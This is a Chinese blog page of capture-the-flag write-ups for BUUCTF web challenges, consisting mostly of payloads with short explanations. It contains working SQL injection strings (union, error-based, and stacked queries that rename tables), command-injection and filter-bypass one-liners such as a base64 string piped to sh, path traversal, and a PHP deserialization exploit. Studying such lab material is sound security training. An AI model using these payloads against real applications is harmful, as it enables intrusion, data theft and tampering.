text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81/?id=240610708\u0026gg=QNKCDZO Origin: http://db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0 Content-Length: 17 passwd=1234567abc [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL åˆ©ç”¨æŠ¥é”™æ³¨å…¥\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))# 1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))# 1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))# 1'or(updatexml(1,concat(0x7e,(select(group_concat(id,'~',username,'~',password))from(H4rDsq1)),0x7e),1))# æ‹¿åˆ°ä¸€åŠçš„flag\n1'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))# [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz \u003c?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-\u003eprocess(); } public function process() { if($this-\u003eop == \"1\") { $this-\u003ewrite(); } else if($this-\u003eop == \"2\") { $res = $this-\u003eread(); $this-\u003eoutput($res); } else { $this-\u003eoutput(\"Bad Hacker!\"); } } private function write() { if(isset($this-\u003efilename) \u0026\u0026 isset($this-\u003econtent)) { if(strlen((string)$this-\u003econtent) \u003e 100) { $this-\u003eoutput(\"Too long!\"); die(); } $res = file_put_contents($this-\u003efilename, $this-\u003econtent); if($res) $this-\u003eoutput(\"Successful!\"); else $this-\u003eoutput(\"Failed!\"); } else { $this-\u003eoutput(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-\u003efilename)) { $res = file_get_contents($this-\u003efilename); } return $res; } private function output($s) { echo \"[Result]: \"; echo $s; } function __destruct() { if($this-\u003eop === \"2\") $this-\u003eop = \"1\"; $this-\u003econtent = \"\"; $this-\u003eprocess(); } } function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } åªè¦è·Ÿè¿›readå‡½æ•°æ˜¯æ€ä¹ˆæ‰§è¡Œå°±è¡Œ\n\u003c?php class FileHandler { public $op=2; public $filename=\"php://filter/read=convert.base64-encode/resource=flag.php\"; public $content; } $exp=new FileHandler(); $exp =serialize($exp); echo $exp; ?str=O:11:\"FileHandler\":3:{S:5:\"\\00\\2A\\00op\";i:2;S:11:\"\\00\\2A\\00filename\";S:8:\"flag.php\";S:10:\"\\00\\2A\\00content\";S:0:\"\";} [GXYCTF2019]BabyUpload æµ‹äº†ä¸€ä¸‹pngå¤´ä¹Ÿè¿‡æ»¤äº†æ”¹ä¸ªjpeg\n","wordCount":"22504","inLanguage":"zh-cn","datePublished":"2025-03-01T00:00:00Z","dateModified":"2025-03-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/ctf/buuctf-web/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=é¦–é¡µ><span>é¦–é¡µ</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=å½’æ¡£><span>å½’æ¡£</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=æ ‡ç­¾><span>æ ‡ç­¾</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=æœç´¢><span>æœç´¢</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=å…³äº><span>å…³äº</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=å‹é“¾><span>å‹é“¾</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2025-03-01 00:00:00 +0000 UTC'>March 1, 2025</span>&nbsp;Â·&nbsp;<span>45 min</span><h1 class=post-title>Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019easysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>admin<span style=color:#960050;background-color:#1e0010>&#39;</span> or 1<span style=color:#f92672>=</span>1#
</span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019havefun>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>f12çœ‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>        $cat=$_GET[&#39;cat&#39;];
</span></span></span><span style=display:flex><span><span style=color:#75715e>        echo $cat;
</span></span></span><span style=display:flex><span><span style=color:#75715e>        if($cat==&#39;dog&#39;){
</span></span></span><span style=display:flex><span><span style=color:#75715e>            echo &#39;Syc{cat_cat_cat_cat}&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>        }
</span></span></span><span style=display:flex><span><span style=color:#75715e>        --&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/?cat<span style=color:#f92672>=</span>dog
</span></span></code></pre></div><h2 id=hctf-2018warmup>[HCTF 2018]WarmUp</h2><p>çœ‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>    <span style=color:#75715e>&lt;!--source.php--&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>emmm</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>checkFile</span>(<span style=color:#f92672>&amp;</span>$page)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            $whitelist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;source&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;source.php&#34;</span>,<span style=color:#e6db74>&#34;hint&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;hint.php&#34;</span>];
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> <span style=color:#a6e22e>isset</span>($page) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>is_string</span>($page)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;you can&#39;t see it&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($page, $whitelist)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            $_page <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_substr</span>(
</span></span><span style=display:flex><span>                $page,
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>mb_strpos</span>($page <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;?&#39;</span>, <span style=color:#e6db74>&#39;?&#39;</span>)
</span></span><span style=display:flex><span>            );
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($_page, $whitelist)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            $_page <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($page);
</span></span><span style=display:flex><span>            $_page <span style=color:#f92672>=</span> <span style=color:#a6e22e>mb_substr</span>(
</span></span><span style=display:flex><span>                $_page,
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>mb_strpos</span>($_page <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;?&#39;</span>, <span style=color:#e6db74>&#39;?&#39;</span>)
</span></span><span style=display:flex><span>            );
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($_page, $whitelist)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;you can&#39;t see it&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> <span style=color:#66d9ef>empty</span>($_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>])
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_string</span>($_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>])
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>emmm</span><span style=color:#f92672>::</span><span style=color:#a6e22e>checkFile</span>($_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>])
</span></span><span style=display:flex><span>    ) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>include</span> $_REQUEST[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&lt;img src=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> /&gt;&#34;</span>;
</span></span><span style=display:flex><span>    }  
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p><code>hint.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>flag</span> <span style=color:#66d9ef>not</span> <span style=color:#a6e22e>here</span>, <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>flag</span> <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>ffffllllaaaagggg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/source.php?file<span style=color:#f92672>=</span>source.php?/../../../../ffffllllaaaagggg
</span></span></code></pre></div><h2 id=actf2020-æ–°ç”Ÿèµ›include>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/?file<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>flag.php
</span></span></code></pre></div><h2 id=actf2020-æ–°ç”Ÿèµ›exec>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>127.0.0.1;ls /
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>127.0.0.1;cat /flag
</span></span></code></pre></div><h2 id=gxyctf2019ping-ping-ping>[GXYCTF2019]Ping Ping Ping</h2><p>è¿™é‡Œä¸»è¦è€ƒå¯Ÿçš„æ˜¯åˆ†æé»‘ç›’è¿‡æ»¤äº†ä»€ä¹ˆä»è€Œæ­£å¸¸è¯»</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?ip<span style=color:#f92672>=</span>127.0.0.1|tac$IFS$9index.php
</span></span></code></pre></div><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>/?ip=
?&gt;

}
  print_r($a);
  echo &#34;
&#34;;
  $a = shell_exec(&#34;ping -c 4 &#34;.$ip);
  }
    die(&#34;fxck your flag!&#34;);
  } else if(preg_match(&#34;/.*f.*l.*a.*g.*/&#34;, $ip)){
    die(&#34;fxck your bash!&#34;);
  } else if(preg_match(&#34;/bash/&#34;, $ip)){
    die(&#34;fxck your space!&#34;);
  } else if(preg_match(&#34;/ /&#34;, $ip)){
    die(&#34;fxck your symbol!&#34;);
    echo preg_match(&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&#34;|\\|\(|\)|\[|\]|\{|\}/&#34;, $ip, $match);
  if(preg_match(&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&#34;|\\|\(|\)|\[|\]|\{|\}/&#34;, $ip, $match)){
  $ip = $_GET[&#39;ip&#39;];
if(isset($_GET[&#39;ip&#39;])){
</code></pre><h3 id=è§£é¢˜1>è§£é¢˜1</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?ip<span style=color:#f92672>=</span>127.0.0.1;a<span style=color:#f92672>=</span>ag;b<span style=color:#f92672>=</span>fl;cat$IFS$1$b$a.php
</span></span></code></pre></div><h3 id=è§£é¢˜2>è§£é¢˜2</h3><p>åˆ©ç”¨base64å’Œshè¿›è¡Œè¯»å–</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/?ip<span style=color:#f92672>=</span>1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</span></span></code></pre></div><h3 id=è§£é¢˜3>è§£é¢˜3</h3><p>å†…è”æ‰§è¡Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/?ip<span style=color:#f92672>=</span>1;cat$IFS$1<span style=color:#e6db74>`</span>ls<span style=color:#e6db74>`</span>
</span></span></code></pre></div><h2 id=suctf-2019easysql>[SUCTF 2019]EasySQL</h2><p>å †å æ³¨å…¥(æˆ‘å·²ç»æœ‰äº›å¿˜äº†),å…ˆè¿›è¡ŒæŸ¥åº“</p><pre tabindex=0><code class=language-sq data-lang=sq>query=1;show databases;
</code></pre><p>çœ‹çš„wpè¿™é‡Œæ˜¯</p><pre tabindex=0><code>select $_POST[&#39;query&#39;] || flag from flag
</code></pre><h3 id=è§£é¢˜1-1>è§£é¢˜1</h3><pre tabindex=0><code>*,1
</code></pre><p>åŸç†æ˜¯æ„æˆäº†è¯­å¥æ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span>,<span style=color:#ae81ff>1</span> <span style=color:#f92672>||</span> flag <span style=color:#66d9ef>from</span> flag
</span></span></code></pre></div><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span>,<span style=color:#ae81ff>1</span> <span style=color:#66d9ef>from</span> flag
</span></span></code></pre></div><h3 id=è§£é¢˜2-1>è§£é¢˜2</h3><p><code>PIPES_AS_CONCAT</code> æ˜¯ MySQL çš„ä¸€ä¸ª SQL æ¨¡å¼é€‰é¡¹ã€‚å¯ç”¨åï¼Œ<code>||</code> ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯é€»è¾‘ OR è¿ç®—ç¬¦ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SET</span> sql_mode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;PIPES_AS_CONCAT&#39;</span>;
</span></span></code></pre></div><p>æ‰€ä»¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span>;<span style=color:#66d9ef>set</span> sql_mode<span style=color:#f92672>=</span>PIPES_AS_CONCAT;<span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>ç±»ä¼¼å°±æ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#66d9ef>set</span> sql_mode<span style=color:#f92672>=</span>PIPES_AS_CONCAT;<span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,flag <span style=color:#66d9ef>from</span> flag
</span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019lovesql>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>admin<span style=color:#960050;background-color:#1e0010>&#39;</span> or 1<span style=color:#f92672>=</span>1#
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>ç™»å…¥å¾—åˆ°</p><pre tabindex=0><code>Your password is &#39;220b8cd38492347b73e6d47a623dcd9a&#39;
</code></pre><p>æ²¡å•¥ç”¨ç»§ç»­æŸ¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; or 1=1 order by 3#
</span></span></span></code></pre></div><p>æµ‹å‡ºä¸‰åˆ—</p><hr><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;union select 1,2,3#
</span></span></span></code></pre></div><p>å›æ˜¾æ˜¯</p><pre tabindex=0><code>Hello 2ï¼

Your password is &#39;3&#39;
</code></pre><hr><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;union select 1,databae(),3#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#34;geek&#34;#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#34;l0ve1ysq1&#34;#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;union select 1,group_concat(password),3 from l0ve1ysq1#
</span></span></span></code></pre></div><p>æœ€åæŸ¥çœ‹flag</p><h2 id=å¼ºç½‘æ¯-2019éšä¾¿æ³¨>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>å…ˆå°è¯•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34; or 1=1#
</span></span></span></code></pre></div><p>è¾“å…¥<code>select</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/select|update|delete|drop|insert|where|\./i&#34;</span>,$inject);
</span></span></code></pre></div><p>å¤§æ¦‚æ˜¯å †å æ³¨å…¥å§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34; or show database()#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;;show database()#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;show tables#
</span></span></span></code></pre></div><p>è¿™é‡Œæˆ‘æ›´å€¾å‘äºå…ˆfuzzä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>array(</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>)</span> {
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>[0]=&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>string(16)</span> <span style=color:#f92672>&#34;1919810931114514&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>array(</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>)</span> {
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>[0]=&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>string(5)</span> <span style=color:#f92672>&#34;words&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>1&#39;;show columns from `words`#
</code></pre><pre tabindex=0><code>1&#39;;show columns from `1919810931114514`#
</code></pre><p>é‡Œé¢æœ‰flagï¼Œæ¥ä¸‹æ¥æ˜¯ä¸‰ç§æ€è·¯</p><h3 id=è§£é¢˜1-2>è§£é¢˜1</h3><p>æ¢è¡¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;</span><span style=color:#ae81ff>12</span><span style=color:#e6db74>&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;show tables#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;show columns from `words`#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; or 1=1#
</span></span></span></code></pre></div><p>åˆ©ç”¨æœ¬æ¥å°±å­˜åœ¨çš„æŸ¥è¯¢æ–¹æ³•å¸®æˆ‘ä»¬è¿›è¡ŒæŸ¥è¯¢</p><h3 id=è§£é¢˜2-2>è§£é¢˜2</h3><p>åˆ©ç”¨é¢„å¤„ç†çš„æ–¹æ³•è¿›è¡Œæ„é€ ï¼Œselect * from `1919810931114514`è¿›è¡Œ16è¿›åˆ¶ç¼–ç (ç¯å¢ƒå¥½åƒæœ‰é—®é¢˜æ²¡æ‰“é€šï¼ŒåŸç†æ˜¯è¿™æ ·çš„)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span>;<span style=color:#66d9ef>SET</span><span style=color:#f92672>@</span>a<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>x73656c656374202a2066726f6d20603139313938313039333131313435313460;<span style=color:#66d9ef>prepare</span> execsql <span style=color:#66d9ef>from</span> <span style=color:#f92672>@</span>a;<span style=color:#66d9ef>execute</span> execsql;<span style=color:#f92672>#</span>
